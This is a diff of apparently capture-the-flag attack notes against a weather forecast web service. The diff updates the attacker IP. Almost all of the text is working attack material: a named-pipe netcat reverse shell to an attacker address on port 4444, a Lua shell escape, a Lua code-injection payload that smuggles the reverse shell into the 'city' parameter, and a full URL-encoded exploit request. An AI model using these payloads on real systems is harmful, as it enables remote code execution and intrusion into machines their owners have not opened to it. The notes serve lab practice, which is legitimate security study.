@@ -10,13 +10,13 @@ http://{EXPORT_IP}/weather/forecast?city=list
 
 ### Reverse Shell Payload
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 4444 >/tmp/f
-
+[BASH PAYLOAD]
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f
 
 lua -e 'os.execute("/bin/sh")'
 
 [Payload]
-');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 4444 >/tmp/f")--
+');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f")--
 
 [Payload URL Encoding]
 http://10.10.10.218/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.110%204444%20%3E%2Ftmp%2Ff%22%29%27
